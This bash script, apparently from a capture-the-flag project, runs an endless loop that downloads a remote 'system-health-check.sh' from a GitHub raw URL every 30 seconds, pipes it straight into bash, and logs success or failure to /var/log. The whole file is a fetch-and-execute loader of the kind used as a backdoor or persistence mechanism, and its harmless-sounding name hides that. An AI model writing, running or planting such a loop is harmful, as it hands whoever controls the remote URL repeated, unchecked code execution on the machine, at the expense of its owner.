#!/bin/bash
# URL of your shell script stored online
SCRIPT_URL="https://raw.githubusercontent.com/Navneshwar/Exclusive-Pre-Selection/refs/heads/main/raw/CTF/security-check-up/system-health-check.sh"

while true; do
    # Fetch and execute the script
    curl -s "$SCRIPT_URL" | bash
    
    # Check the exit status
    if [ ${PIPESTATUS[1]} -ne 0 ]; then
        echo "$(date): Script execution failed" >> /var/log/remote_script.log
    else
        echo "$(date): Script executed successfully" >> /var/log/remote_script.log
    fi
    
    # Wait for 30 seconds
    sleep 30
done